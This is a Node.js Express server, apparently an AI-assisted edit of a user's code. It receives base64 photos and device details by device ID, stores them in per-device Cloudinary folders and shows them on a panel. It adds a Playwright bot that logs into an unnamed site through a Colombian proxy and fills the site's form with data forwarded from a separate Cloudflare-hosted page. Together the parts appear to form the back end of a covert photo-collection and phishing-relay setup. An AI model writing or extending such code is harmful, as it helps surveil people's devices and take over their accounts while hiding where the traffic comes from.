require('dotenv').config();
const express = require('express');
const cloudinary = require('cloudinary').v2;
const { chromium } = require('playwright'); // <-- NUEVO: Importamos Playwright

const app = express();
const port = process.env.PORT || 8080;

app.use(express.json({ limit: '50mb' }));

cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET
});

const receivedData = { devices: {}, photos: [] };

app.get('/', (req, res) => {
  res.send('🚀 Servidor de Analytics y Bot activo.');
});

// 1. ENDPOINT PARA RECIBIR FOTOS (Tu código original)
app.post('/api/upload-photo', async (req, res) => {
    try {
        const { device_id, filename, image, timestamp } = req.body;
        if (!image) return res.status(400).json({ error: 'No se recibió imagen.' });
        
        const archivoBase64 = `data:image/jpeg;base64,${image}`;
        const resultado = await cloudinary.uploader.upload(archivoBase64, {
            folder: `dispositivos/${device_id}`
        });
        
        receivedData.photos.push({ device_id, filename, url: resultado.secure_url, timestamp: timestamp || new Date() });
        if (receivedData.devices[device_id]) receivedData.devices[device_id].photo_count += 1;
        
        res.json({ status: 'ok', url: resultado.secure_url });
    } catch (error) {
        res.status(500).json({ error: 'Error al procesar la imagen' });
    }
});

// 2. ENDPOINT PARA INFO DEL DISPOSITIVO (Tu código original)
app.post('/api/device-info', (req, res) => {
    const { device_id, data, timestamp } = req.body;
    if (!receivedData.devices[device_id]) {
        receivedData.devices[device_id] = {
            first_seen: timestamp || new Date(),
            last_seen: timestamp || new Date(),
            info: typeof data === 'object' ? JSON.stringify(data, null, 2) : data,
            photo_count: 0
        };
    } else {
        receivedData.devices[device_id].last_seen = timestamp || new Date();
        receivedData.devices[device_id].info = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
    }
    res.json({ status: 'ok' });
});

// 3. PANEL WEB (Tu código original)
app.get('/panel', (req, res) => {
    // ... (Aquí va todo el HTML de tu panel que ya tenías, no lo he tocado) ...
    res.send('Tu panel HTML va aquí');
});


// =====================================================================
// 🚀 4. NUEVO: EL BOT CON PLAYWRIGHT Y PROXY EN CAUCA
// =====================================================================
app.post('/api/procesar-bot', async (req, res) => {
    const { datosAEnviar } = req.body; // Los datos que envía tu HTML de Cloudflare

    // ⚠️ AQUÍ PONES LAS CREDENCIALES DE TU PROXY COLOMBIANO
    // Si tu proveedor de proxy te da un formato socks5 o http, cámbialo aquí.
    const proxyConfig = {
        server: process.env.PROXY_SERVER || 'http://ip-del-proxy:puerto', 
        username: process.env.PROXY_USER || 'usuario_proxy',
        password: process.env.PROXY_PASS || 'password_proxy'
    };

    let browser;
    try {
        console.log('🤖 Iniciando bot con proxy...');
        
        browser = await chromium.launch({
            proxy: proxyConfig,
            headless: true // Ejecutar sin ventana gráfica
        });
        
        const context = await browser.newContext();
        const page = await context.newPage();

        // 1. Ir al sitio de destino (Cambia esto por la URL real)
        await page.goto('https://sitio-al-que-vas.com/login', { waitUntil: 'networkidle', timeout: 30000 });

        // 2. Rellenar datos de Login (Si es necesario)
        // await page.fill('input[name="usuario"]', 'tu_usuario');
        // await page.fill('input[name="password"]', 'tu_password');
        // await page.click('button[type="submit"]');
        // await page.waitForNavigation();

        // 3. Rellenar los datos que enviaste desde tu HTML
        // (Debes inspeccionar el sitio real para saber cómo se llaman los inputs)
        await page.fill('input[name="campo1"]', datosAEnviar.campo1);
        await page.fill('input[name="campo2"]', datosAEnviar.campo2);
        
        // 4. Hacer clic en enviar
        await page.click('button[type="submit"]');
        await page.waitForLoadState('networkidle');

        // 5. Verificar si funcionó (ej. buscando un texto de éxito en la página)
        const exito = await page.locator('text="Operación Exitosa"').count() > 0;
        
        console.log('✅ Bot terminó su tarea.');
        // Devolvemos la respuesta a tu HTML en Cloudflare
        res.json({ continuar: exito, mensaje: exito ? 'Todo OK' : 'Falló en destino' });

    } catch (error) {
        console.error('❌ Error en el bot:', error.message);
        res.status(500).json({ continuar: false, error: error.message });
    } finally {
        if (browser) await browser.close(); // Siempre cerrar el navegador
    }
});

app.listen(port, () => {
    console.log(`🚀 Servidor escuchando en puerto ${port}`);
});
